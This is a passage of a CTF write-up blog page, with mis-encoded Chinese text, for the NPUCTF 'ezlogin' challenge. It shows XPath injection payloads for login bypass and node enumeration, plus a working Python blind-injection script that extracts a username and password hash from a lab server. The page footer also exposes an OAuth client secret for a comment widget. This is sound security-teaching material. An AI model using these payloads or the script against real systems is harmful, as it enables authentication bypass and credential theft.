<h1 id="0x03-ezlogin"><a href="#0x03-ezlogin" class="headerlink" title="0x03 ezlogin"></a>0x03 ezlogin</h1><p>xpathæ³¨å…¥</p>
<blockquote>
<p>æŸ¥è¯¢è¯­å¥ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;&#x2F;root&#x2F;accounts&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]&quot;;</span><br></pre></td></tr></table></figure>

<p>1.ä¸‡èƒ½å¯†ç ï¼Œè¿™ç‚¹å’ŒSQLå¾ˆåƒï¼›åœ¨çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼Œä½¿ç”¨ä¸¤ä¸ªorç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;fake&#39; or &#39;1&#39;or&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>2.ä½¿ç”¨<code>|</code>æ“ä½œç¬¦ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1&#39;]|&#x2F;&#x2F;*|ss[&#39;&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>å…¶æ‰§è¡Œçš„è¯­å¥ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;accounts&#x2F;user[username&#x2F;text()&#x3D;&#39;1&#39; ]|&#x2F;&#x2F;*|ss[&#39;&#39; and password&#x2F;text()&#x3D;&#39;1&#39;]</span><br></pre></td></tr></table></figure>

<p>å³å…ˆé—­åˆå‰é¢çš„è¯­å¥ï¼Œä¹‹å<code>//*</code>åˆ—å‡ºæ–‡æ¡£æ‰€æœ‰å…ƒç´ </p>
<p>3.ç›²æ³¨ï¼Œéœ€è¦ä¸€çº§ä¸€çº§çŒœè§£èŠ‚ç‚¹ï¼›çŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(name(&#x2F;*[position()&#x3D;1]),1,1)&#x3D;&#39;r&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹æ•°é‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1&#39; or count(&#x2F;root&#x2F;*)&#x3D;2 or &#39;1&#39;&#x3D;&#39;1&amp;fake</span><br></pre></td></tr></table></figure>

<p>çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(name(&#x2F;root&#x2F;*[position()&#x3D;1]),1,1)&#x3D;&#39;u&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>çŒœè§£idä¸º1çš„userèŠ‚ç‚¹ä¸‹çš„usernameå€¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(&#x2F;root&#x2F;users&#x2F;user[id&#x3D;1]&#x2F;username,1,1)&#x3D;&#39;a&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://a1de621a-25c0-4bb0-b867-649ffc93c5f0.node3.buuoj.cn/'</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">token</span><span class="params">()</span>:</span></span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">'&lt;input type="hidden" id="token" value="(.*)" /&gt;'</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">'login.php'</span>,data=data,headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;)</span><br><span class="line">    print(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">"' or  substring(name(/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'root'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'accounts'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'user'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment">#'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or'1'='1ä¹Ÿå¯ä»¥</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'*'</span>:</span><br><span class="line">            print(<span class="string">'false'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.format(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">'ad'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'éæ³•æ“ä½œ'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            print(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åç™»å½•è¿›å»ä¼ªåè®®å¤§å°å†™ç»•è¿‡å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<h1 id="0x04-webğŸ•"><a href="#0x04-webğŸ•" class="headerlink" title="0x04 webğŸ•"></a>0x04 webğŸ•</h1><p><a href="https://mount4in.github.io/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/">çœ‹å‰ä¸€ç¯‡æ–‡ç« </a></p>
<p>å‚è€ƒï¼š</p>
<p><a href="https://github.com/sqxssss/NPUCTF_WriteUps" target="_blank" rel="noopener">https://github.com/sqxssss/NPUCTF_WriteUps</a></p>

      
    </div>
  </div>
  <!-- è¦æ·»åŠ çš„å†…å®¹ -->
  
    <div>
        <ul class="post-copyright">
          <li class="post-copyright-author">
          <strong>ä½œè€…:  </strong>Mount4in</a>
          </li>
          <li class="post-copyright-link">
          <strong>æ–‡ç« é“¾æ¥:  </strong>
          <a href="/2020/04/26/NPUCTF-WP/" target="_blank" title="NPUCTF_WP">http://mount4in.github.io/2020/04/26/NPUCTF-WP/</a>
          </li>
          <li class="post-copyright-license">
            <strong>ç‰ˆæƒå£°æ˜:   </strong>
            æœ¬ç½‘ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–,å‡é‡‡ç”¨ <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
            è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„!
          </li>
        </ul>
      <div>

  
  <!---->
    <footer class="article-footer">
      <a data-url="http://mount4in.github.io/2020/04/26/NPUCTF-WP/" data-id="clg20p5uu001i14uv6hdsdr3c"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>



  
    
  <nav class="article-nav">
    
      <a href="/2020/04/30/Zer0pts2020-musicblog/" class="article-nav-link">
        <strong class="article-nav-caption">Newer</strong>
        <div class="article-nav-title">
          
            Zer0pts2020 Writeup
          
        </div>
      </a>
    
    
      <a href="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/" class="article-nav-link">
        <strong class="article-nav-caption">Older</strong>
        <div class="article-nav-title">ä»ä¸€é“ctfé¢˜å­¦ä¹ cbc-padding-oracleå’Œcbcç¿»è½¬</div>
      </a>
    
  </nav>


  


  
    
  <div class="gitalk" id="gitalk-container"></div>
  
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">

  
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

  
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>

  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: 'b7d32ae2538e1a71f462',
      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
      repo: 'gitalk',
      owner: 'Mount4in',
      admin: ['Mount4in'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2023 Mount4in</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>
<aside class="sidebar">
  <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="Search">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
</aside>

<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


  
<script src="/fancybox/jquery.fancybox.min.js"></script>




  
<script src="/js/tocbot.min.js"></script>

  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>



<script src="/js/ocean.js"></script>


</body>
</html>